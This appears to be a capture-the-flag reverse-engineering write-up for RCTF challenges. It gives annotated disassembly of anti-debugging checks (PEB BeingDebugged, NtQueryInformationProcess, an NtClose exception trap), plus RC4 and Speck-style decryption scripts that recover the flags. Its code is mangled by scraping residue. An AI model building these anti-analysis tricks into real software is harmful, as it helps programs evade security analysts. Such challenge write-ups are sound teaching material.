ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040154E mov byte ptr [ebp-84h],0Fh.text:
00401555 mov byte ptr [ebp-83h],1Ah.text:
0040155C mov byte ptr [ebp-82h],8Ah.text:
00401563 mov byte ptr [ebp-81h],5Ah ;'Z'.text:
0040156A mov byte ptr [ebp-80h],22h ;'"'.text:
0040156E mov byte ptr [ebp-7Fh],0ABh.text:
00401572 mov byte ptr [ebp-7Eh],1Eh.text:
00401576 mov byte ptr [ebp-7Dh],63h ;'c'.text:
0040157A mov byte ptr [ebp-7Ch],19h.text:
0040157E mov byte ptr [ebp-7Bh],5Ah ;'Z'.text:
00401582 mov byte ptr [ebp-7Ah],87h.text:
00401586 mov byte ptr [ebp-79h],0F2h.text:
0040158A mov byte ptr [ebp-78h],0E6h.text:
0040158E mov byte ptr [ebp-77h],0E9h.text:
00401592 mov byte ptr [ebp-76h],0D7h.text:
00401596 mov byte ptr [ebp-75h],0D1h.text:
0040159A mov byte ptr [ebp-74h],97h.text:
0040159E mov byte ptr [ebp-73h],0F9h.text:
004015A2 mov byte ptr [ebp-72h],0F8h.text:
004015A6 mov byte ptr [ebp-71h],32h ;'2'.text:
004015AA mov byte ptr [ebp-70h],5Bh ;'['.text:
004015AE mov byte ptr [ebp-6Fh],0DEh.text:
004015B2 mov byte ptr [ebp-6Eh],2Dh ;'-'.text:
004015B6 mov byte ptr [ebp-6Dh],0D6h.text:
004015BA mov byte ptr [ebp-6Ch],0A3h.text:
004015BE mov byte ptr [ebp-6Bh],4Fh ;'O'.text:
004015C2 mov byte ptr [ebp-6Ah],7Eh ;'~'.text:
004015C6 mov byte ptr [ebp-69h],0CBh.text:
004015CA mov byte ptr [ebp-68h],61h ;'a'.text:
004015CE mov byte ptr [ebp-67h],0B2h.text:
004015D2 mov byte ptr [ebp-66h],3Fh ;'?'.text:
004015D6 mov byte ptr [ebp-65h],0BFh.text:
004015DA mov byte ptr [ebp-64h],0B7h.text:
004015DE mov byte ptr [ebp-63h],1Bh.text:
004015E2 mov byte ptr [ebp-62h],0Ah.text:
004015E6 mov byte ptr [ebp-61h],84h.text:
004015EA mov byte ptr [ebp-60h],0B3h.text:
004015EE mov byte ptr [ebp-5Fh],0B4h.text:
004015F2 mov byte ptr [ebp-5Eh],0DEh.text:
004015F6 mov byte ptr [ebp-5Dh],3.text:
004015FA mov byte ptr [ebp-5Ch],46h ;'F'.text:
004015FE mov byte ptr [ebp-5Bh],7Bh ;'{'.text:
00401602 mov byte ptr [ebp-5Ah],83h.text:
00401606 mov byte ptr [ebp-59h],0F0h.text:
0040160A mov byte ptr [ebp-58h],0C4h.text:
0040160E mov byte ptr [ebp-57h],0B3h.text:
00401612 mov byte ptr [ebp-56h],0ABh.text:
00401616 mov byte ptr [ebp-55h],7Bh ;'{'.text:
0040161A mov byte ptr [ebp-54h],29h ;')'.text:
0040161E mov byte ptr [ebp-53h],0BCh.text:
00401622 mov byte ptr [ebp-52h],1Fh.text:
00401626 mov byte ptr [ebp-51h],0FEh.text:
0040162A mov byte ptr [ebp-50h],8Ah.text:
0040162E mov byte ptr [ebp-4Fh],79h ;'y'.text:
00401632 mov byte ptr [ebp-4Eh],26h ;'&'.text:
00401636 mov byte ptr [ebp-4Dh],0DAh.text:
0040163A mov byte ptr [ebp-4Ch],8.text:
0040163E mov byte ptr [ebp-4Bh],1.text:
00401642 mov byte ptr [ebp-4Ah],85h.text:
00401646 mov byte ptr [ebp-49h],66h ;'f'.text:
0040164A mov byte ptr [ebp-48h],7Dh ;'}'.text:
0040164E mov byte ptr [ebp-47h],0BBh.text:
00401652 mov byte ptr [ebp-46h],0EEh.text:
00401656 mov byte ptr [ebp-45h],0Fh.text:
0040165A mov byte ptr [ebp-44h],89h.text:
0040165E mov byte ptr [ebp-43h],59h ;'Y'.text:
00401662 mov byte ptr [ebp-42h],0D4h.text:
00401666 mov byte ptr [ebp-41h],5Fh ;'_'.text:
0040166A mov byte ptr [ebp-40h],0ACh.text:
0040166E mov byte ptr [ebp-3Fh],18h.text:
00401672 mov byte ptr [ebp-3Eh],0AEh.text:
00401676 mov byte ptr [ebp-3Dh],0Bh.text:
0040167A mov byte ptr [ebp-3Ch],4Eh ;'N'.text:
0040167E mov byte ptr [ebp-3Bh],0F0h.text:
00401682 mov byte ptr [ebp-3Ah],0B7h.text:
00401686 mov byte ptr [ebp-39h],5.text:
0040168A mov byte ptr [ebp-38h],5Ch ;''.text:
0040168E mov byte ptr [ebp-37h], 81h.text:
00401692 mov byte ptr [ebp-36h], 4.text:
00401696 mov byte ptr [ebp-35h], 9Fh.text:
0040169A mov byte ptr [ebp-34h], 0A4h.text:
0040169E mov byte ptr [ebp-33h], 1Ch.text:
004016A2 mov byte ptr [ebp-32h], 5Dh ; ']'.text:
004016A6 mov byte ptr [ebp-31h], 0A0h.text:
004016AA mov byte ptr [ebp-30h], 0B9h.text:
004016AE mov byte ptr [ebp-2Fh], 7.text:
004016B2 mov byte ptr [ebp-2Eh], 92h.text:
004016B6 mov byte ptr [ebp-2Dh], 5Ch ; ''.text:
004016BA mov byte ptr [ebp-2Ch], 8Ah.text:
004016BE mov byte ptr [ebp-2Bh], 53h ; 'S'
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040175A push 80h ; key 长度0x80.text:
0040175F mov edx, [ebp-190h] ; key 指针 = dword_40440C.text:
00401765 push edx.text:
00401766 lea eax, [ebp-18Ch] ; RC4 state.text:
0040176C push eax.text:
0040176D call sub_4017D0 ; RC4 KSA.text:
00401772 add esp,0Ch.text:
00401775 push 80h.text:
0040177A lea ecx, [ebp-84h] ; 密文缓冲.text:
00401780 push ecx.text:
00401781 lea edx, [ebp-18Ch] ; RC4 state.text:
00401787 push edx.text:
00401788 call sub_4018A0 ; RC4 PRGA + XOR.text:
0040178D add esp,0Ch.text:
00401790 lea eax, [ebp-84h].text:
00401796 push eax.text:
00401797 push offset aYourFlagIsS ;"your flag is %s".text:
0040179C call sub_401050
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.data:
0040400B db0FFh.data:
0040400C dword_40400C dd1 ;DATA XREF: sub_40206D+2↑r.data:
00404010dword_404010 dd1 ;DATA XREF: sub_4022F5+D↑w.data:
00404010 ;sub_4022F5:
loc_402409↑r ....data:
00404014dword_404014 dd1 ;DATA XREF: sub_4024C6+2↑r.data:
00404018dword_404018 dd12345678h ;DATA XREF: .text:
00401522↑r.data:
0040401C aFlagTh1sflagls db'flag:{Th1sflaglsG00ds}',0.data:
00404033 db 0.data:
00404034 db 0.data:
00404035 db 0.data:
00404036 db 0.data:
00404037 db 0.data:
00404038 db 0
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
00401440sub_401440 proc near ;CODE XREF: .text:
004010F1↑p....text:
0040144D push 0 ; lpModuleName =NULL.text:
0040144F call ds:
GetModuleHandleA.text:
00401455 mov [ebp+var_8], eax ; 模块基址.text:
00401458 mov [ebp+var_4],0.text:
0040145F jmp short loc_40146A.text:
00401461loc_401461:.text:
00401461 mov eax, [ebp+var_4].text:
00401464 add eax,1.text:
00401467 mov [ebp+var_4], eax.text:
0040146A loc_40146A:.text:
0040146A cmp [ebp+var_4],10000h.text:
00401471 jnb short loc_4014AA.text:
00401473 mov ecx, [ebp+var_8].text:
00401476 add ecx, [ebp+var_4].text:
00401479 mov edx, [ecx] ; 取一个 dword.text:
0040147B mov [ebp+var_C], edx.text:
0040147E cmp [ebp+var_C],12345678h.text:
00401485 jnz short loc_4014A8.text:
00401487 mov eax, [ebp+var_8].text:
0040148A add eax, [ebp+var_4].text:
0040148D movsx ecx, byte ptr [eax+4].text:
00401491 cmp ecx,75h ;'u'.text:
00401494 jz short loc_4014A8.text:
00401496 mov edx, [ebp+var_4].text:
00401499 mov eax, [ebp+var_8].text:
0040149C lea ecx, [eax+edx+4].text:
004014A0 mov dword_40440C, ecx ; 保存指针.text:
004014A6 jmp short loc_4014AA.text:
004014AA loc_4014AA:.text:
004014AA mov eax, dword_40440C.text:
004014AF mov esp, ebp.text:
004014B1 pop ebp.text:
004014B2 retn
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004010DA loc_4010DA:.text:
004010DA mov ebx,22222222h.text:
004010DF mov byte ptr [ebp-5],1.text:
004010E3 push eax.text:
004010E4 mov eax,large fs:
30h ; PEB.text:
004010EA mov al, [eax+2] ; BeingDebugged.text:
004010ED mov [ebp-5], al.text:
004010F0 pop eax.text:
004010F1 call sub_401440 ; 设置 dword_40440C.text:
004010F6 mov dword_404408,8.text:
00401100 movzx eax, byte ptr [ebp-5].text:
00401104 test eax, eax.text:
00401106 jz short loc_40110A ; 未调试 -> 改 key.text:
00401108 jmp short loc_401119.text:
0040110A loc_40110A:.text:
0040110A mov ecx, dword_40440C.text:
00401110 add ecx, dword_404408 ; +8.text:
00401116 mov byte ptr [ecx],69h ;'i'
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040124A loc_40124A:.text:
0040124A mov ebx,22222222h.text:
0040124F call ds:
GetCurrentProcess.text:
00401255 mov [ebp-10h], eax.text:
00401258 push 0.text:
0040125A push 4.text:
0040125C lea eax, [ebp-8] ; 输出句柄位置.text:
0040125F push eax.text:
00401260 push 7 ; ProcessInformationClass =7.text:
00401262 mov ecx, [ebp-10h].text:
00401265 push ecx ; ProcessHandle.text:
00401266 call dword ptr [ebp+8] ; NtQueryInformationProcess.text:
00401269 mov dword_404408,0Eh.text:
00401273 cmp dword ptr [ebp-8],0.text:
00401277 jz short loc_40127B ; ==0则改 key.text:
00401279 jmp short loc_40128A.text:
0040127B loc_40127B:.text:
0040127B mov edx, dword_40440C.text:
00401281 add edx, dword_404408 ; +0x0E.text:
00401287 mov byte ptr [edx],49h ;'I'
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040130D loc_40130D:.text:
0040130D mov ebx,22222222h.text:
00401312 push offset aNtdllDll_0 ;"Ntdll.dll".text:
00401317 call ds:
LoadLibraryW.text:
0040131D mov [ebp-24h], eax.text:
00401320 cmp dword ptr [ebp-24h],0.text:
00401324 jnz short loc_401328.text:
00401326 jmp short loc_401383.text:
00401328loc_401328:.text:
00401328 mov dword_404408,11h.text:
00401332 push offset aNtclose ;"NtClose".text:
00401337 mov eax, [ebp-24h].text:
0040133A push eax.text:
0040133B call ds:
GetProcAddress ; 取 NtClose 地址到 [ebp-28h].text:
00401341 mov [ebp-28h], eax.text:
00401344 cmp dword ptr [ebp-28h],0.text:
00401348 jnz short loc_40134C.text:
0040134A jmp short loc_401383.text:
0040134C loc_40134C:.text:
0040134C mov dword ptr [ebp-4],0.text:
00401353 push 99999999h.text:
00401358 call dword ptr [ebp-28h] ;NtClose(0x99999999).text:
0040135B mov dword ptr [ebp-4],0FFFFFFFEh.text:
00401362 jmp short loc_401383
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040136A sub_40136A proc near ; SEH handler.text:
0040136A mov esp, [ebp-18h].text:
0040136D mov ecx, dword_40440C.text:
00401373 add ecx, dword_404408 ; +0x11.text:
00401379 mov byte ptr [ecx],6Fh ;'o'.text:
0040137C mov dword ptr [ebp-4],0FFFFFFFEh
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004013EA loc_4013EA:.text:
004013EA mov ebx,22222222h.text:
004013EF call ds:
GetCurrentProcess.text:
004013F5 mov [ebp-10h], eax.text:
004013F8 push 0.text:
004013FA push 4.text:
004013FC lea eax, [ebp-8].text:
004013FF push eax.text:
00401400 push 1Fh ; infoclass=0x1F(ProcessDebugFlags).text:
00401402 mov ecx, [ebp-10h].text:
00401405 push ecx.text:
00401406 call dword ptr [ebp+8] ; NtQueryInformationProcess.text:
00401409 mov dword_404408,12h.text:
00401413 cmp dword ptr [ebp-8],1.text:
00401417 jz short loc_40141B.text:
00401419 jmp short loc_40142A.text:
0040141B loc_40141B:.text:
0040141B mov edx, dword_40440C.text:
00401421 add edx, dword_404408 ; +0x12.text:
00401427 mov byte ptr [edx],6Fh ;'o'
ounter(lineflag:{ThisflagIsGoods}
ounter(lineounter(lineounter(lineounter(linepush80h ; key 长度0x80push[ebp-190h] ; key 指针 = dword_40440Cpush&statecall sub_4017D0
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004017D0 sub_4017D0 proc near....text:
004017E4 mov eax, [ebp+arg_0].text:
004017E7 mov byte ptr [eax+101h],0 ; j =0.text:
004017EE mov ecx, [ebp+arg_0].text:
004017F1 mov byte ptr [ecx+100h],0 ; i =0.text:
004017F8 mov [ebp+var_4],0.text:
004017FF jmp short loc_40180A.text:
0040180A loc_40180A: ; 初始化 S[i] = i.text:
0040180A cmp [ebp+var_4],100h.text:
00401811 jnb short loc_401820.text:
00401813 mov eax, [ebp+arg_0].text:
00401816 add eax, [ebp+var_4].text:
00401819 mov cl, byte ptr [ebp+var_4].text:
0040181C mov [eax], cl....text:
00401820loc_401820: ; KSA 主循环.text:
00401820 mov [ebp+var_4],0....text:
00401832loc_401832:.text:
00401832 cmp [ebp+var_4],100h.text:
00401839 jnb short loc_40189A.text:
0040183B mov eax, [ebp+arg_0].text:
0040183E add eax, [ebp+var_4].text:
00401841 movzx ecx, byte ptr [eax].text:
00401844 mov [ebp+var_10], ecx ; S[i].text:
00401847 mov edx, [ebp+arg_4].text:
0040184A add edx, [ebp+var_C] ; key[j].text:
0040184D movzx eax, byte ptr [edx].text:
00401850 add eax, [ebp+var_10].text:
00401853 add eax, [ebp+var_8].text:
00401856 mov [ebp+var_8], eax ; j += S[i] + key[i%keylen].text:
00401859 mov ecx, [ebp+var_8].text:
0040185C and ecx,0FFh.text:
00401862 mov [ebp+var_8], ecx ; j &=0xFF...; 然后交换 S[i], S[j]
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004018A6 mov eax, [ebp+arg_0].text:
004018A9 mov [ebp+var_4], eax ; S base.text:
004018AC mov ecx, [ebp+arg_0].text:
004018AF movzx edx, byte ptr [ecx+100h].text:
004018B6 mov [ebp+var_8], edx ; i.text:
004018B9 mov eax, [ebp+arg_0].text:
004018BC movzx ecx, byte ptr [eax+101h].text:
004018C3 mov [ebp+var_C], ecx ; j....text:
004018D5 cmp [ebp+var_18],0.text:
004018D9 jz short loc_401955 ; 长度耗尽结束.text:
004018DB mov ecx, [ebp+var_8].text:
004018DE add ecx,1.text:
004018E1 and ecx,0FFh.text:
004018E7 mov [ebp+var_8], ecx ; i = (i+1)&0xFF.text:
004018EA mov edx, [ebp+var_4].text:
004018ED add edx, [ebp+var_8].text:
004018F0 movzx eax, byte ptr [edx].text:
004018F3 mov [ebp+var_10], eax ; S[i].text:
004018F6 mov ecx, [ebp+var_C].text:
004018F9 add ecx, [ebp+var_10].text:
004018FC and ecx,0FFh.text:
00401902 mov [ebp+var_C], ecx ; j = (j+S[i])&0xFF...; 交换 S[i], S[j]，然后：.text:
00401927 mov edx, [ebp+var_10].text:
0040192A add edx, [ebp+var_14].text:
0040192D and edx,0FFh.text:
00401933 mov eax, [ebp+var_4].text:
00401936 movzx ecx, byte ptr [eax+edx] ; S[(S[i]+S[j])&0xFF].text:
0040193A mov edx, [ebp+arg_4].text:
0040193D movzx eax, byte ptr [edx].text:
00401940 xor eax, ecx ; data ^= K.text:
00401942 mov ecx, [ebp+arg_4].text:
00401945 mov [ecx], al.text:
00401947 mov edx, [ebp+arg_4].text:
0040194A add edx,1.text:
0040194D mov [ebp+arg_4], edx ; data++.text:
00401950 jmp loc_4018C6 ; 继续下一个字节
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linekey_str =b"flag:{ThisflagIsGoods}"KEY_LEN =0x80key =bytearray(key_str +b"x00"* (KEY_LEN -len(key_str)))cipher =bytes([ 0x0f,0x1a,0x8a,0x5a,0x22,0xab,0x1e,0x63, 0x19,0x5a,0x87,0xf2,0xe6,0xe9,0xd7,0xd1, 0x97,0xf9,0xf8,0x32,0x5b,0xde,0x2d,0xd6, 0xa3,0x4f,0x7e,0xcb,0x61,0xb2,0x3f,0xbf, 0xb7,0x1b,0x0a,0x84,0xb3,0xb4,0xde,0x03, 0x46,0x7b,0x83,0x2a,0x51,0x73,0xe0,0x7c, 0x93,0x27,0x44,0x9c,0x56,0x8f,0x75,0xfa, 0xa0,0x79,0x26,0xda,0x08,0x01,0x85,0x66, 0x7d,0xbb,0xee,0x0f,0x89,0x59,0xd4,0x5f, 0xac,0x18,0xae,0x0b,0x4e,0xf0,0xb7,0xdd, 0xdd,0x55,0x4b,0xea,0x07,0x92,0x5c,0x8a, 0x53,0xf3,0xff,0xf7,0xa7,0xdd,0x2e,0xe6, 0xed,0x0f,0x77,0x2c,0x4a,0x22,0xf1,0x36, 0x4f,0xa7,0x55,0x5e,0x3e,0x93,0xa4,0x34, 0x29,0x67,0xfc,0x23,0x79,0x19,0xd8,0xc9, 0x2b,0xcf,])defrc4_ksa(key_bytes): S =list(range(256)) j =0 keylen =len(key_bytes) foriinrange(256): j = (j + S[i] + key_bytes[i % keylen]) &0xFF S[i], S[j] = S[j], S[i] returnSdefrc4_prga(S, data): i = j =0 out =bytearray() forbindata: i = (i +1) &0xFF j = (j + S[i]) &0xFF S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) &0xFF] out.append(b ^ k) returnbytes(out)S = rc4_ksa(key)plain = rc4_prga(S, cipher)print(plain)"""b'RCTF{AntiDbg_Reversing_2025_v2.0_Ch4llenge}xdax95xc0Kx07xbax9b[bxdcxf6S xa8xxa3xbcuxbakixf4xe2:P%AzTxe2xe8x19x0ex12qxb3ByIx16Jxbex95xcexd6xd9xa0x0cx08Pzxf3xc8x0bxe2x[fhxd3xc7yxe8xf2xb03Exa0G|9xc2xb0xdd-xf1xaexd7xec'"""
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line00010223	.text:
vm_execute+A96 mov rax, [rax+rcx] RAX=48F0E6421AC66DEA00010223	.text:
vm_execute+60B mov rcx, [rsp+rdi*8+328h+s] RCX=48F0E6421AC66DEA 00010223	.text:
vm_execute+613 mov rdx, rcx RDX=48F0E6421AC66DEA key0 =0x36B1CC9FE433713D 提取于：00010223	.text:
vm_execute:
loc_55555556BE01	mov rax, [rax+rcx];opcode 0x18: MOV reg, [BP+addr] - 从内存[BP+offset]加载到寄存器	RAX=36B1CC9FE433713Dkey1 =0xF97646D69C84EBD8 提取于：00010223	.text:
vm_execute:
loc_55555556BE01	mov rax, [rax+rcx];opcode 0x18: MOV reg, [BP+addr] - 从内存[BP+offset]加载到寄存器	RAX=F97646D69C84EBD8
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#include<stdio.h>#include<stdint.h>// 32位循环移位uint32_tror32(uint32_tv,ints) { s &=31;return(v >> s) | (v << (32- s)); }uint32_trol32(uint32_tv,ints) { s &=31;return(v << s) | (v >> (32- s)); }// speck解密uint64_tvm_tea_decrypt(uint64_tinput) { uint32_tv0 = input &0xFFFFFFFF; uint32_tv1 = (input >>32) &0xFFFFFFFF; uint32_tkeys[27]; uint32_tr2 =0xE433713D, r3 =0x36B1CC9F, r4 =0x9C84EBD8, r5 =0xF97646D6; for(inti =0; i <27; i++) { keys[i] = r2; if(i <26) { uint32_tt0 =ror32(r3,8) + r2; t0 ^= i; uint32_tt1 =rol32(r2,3) ^ t0; r2 = t1; r3 = r4; r4 = r5; r5 = t0; } } for(inti =26; i >=0; i--) { v1 ^= v0; v1 =ror32(v1,3); v0 ^= keys[i]; v0 -= v1; v0 =rol32(v0,8); } return((uint64_t)v1 <<32) | v0;}// reverseuint64_treverse_xor(uint64_tv) { v ^=0x8CB331163A92FC19ULL; v +=0x5566488C9C5CF234ULL; v ^=0x5074D85B9194E696ULL; v +=0x48F0E6421AC66DEAULL; returnv;}intmain() { uint64_ttarget =0xDA19BA6B81C83F61ULL; uint64_tafter_tea =vm_tea_decrypt(target); printf("TEA dec: 0x%016llxn", after_tea); uint64_tresult =reverse_xor(after_tea); printf("Result: 0x%016llx (%llu)n", result, result); return0;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineba610b6c5d80c91abf11b34d0ce941cca28f38bd0463522c79ed5d84199dd9cb4d9c56b2a1d77a0dfe13c54ceb12fea8494a63fc85b9953aad1f6be84bbb4680cd05f91609d653fa55493aa141fbe86f25bc9aff736b80a8d8817dda43824d2c5fcca9a9cb65130d6f3ed35da24dacfab5e1534e1dc36c87ac1b4e2750778a01c8f82d07316dcd3b36646367b78c2f919eed7637cd5eaa26ff546a0085041459ef320f9e6ae315201e00a4b9e25488f61a9a0626a035fb9de2f1eb0e5248cd2c8a0bf5239eed75c4749e8082db34037df4d25540ed584887c12422512500c8877e1a125dcfa56359497cff13eaa5bf76d51ceddab7795459a922933b0b315a10cabd557ffa1df043e0459b855188d04582700d6f6a986873c01552dff3a12f670615548ece7312fb0e189fa8296579138d4c8f2124957228451572c65bcb3425554fca602792e8794f749f6bbca2014cb1e1adc831c8d5679c73a6d3f711e66e2ab305ec4e07b0b498a16d274bb044d2c409de0e72c1029e5e68e47d3a360a80a1570f48caceb3ddd6ab1c9a18ebb936RCTF{VM_ALU_SMC_RC4_SPECK!_593eb6079d2da6c187ed462b033fee34}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]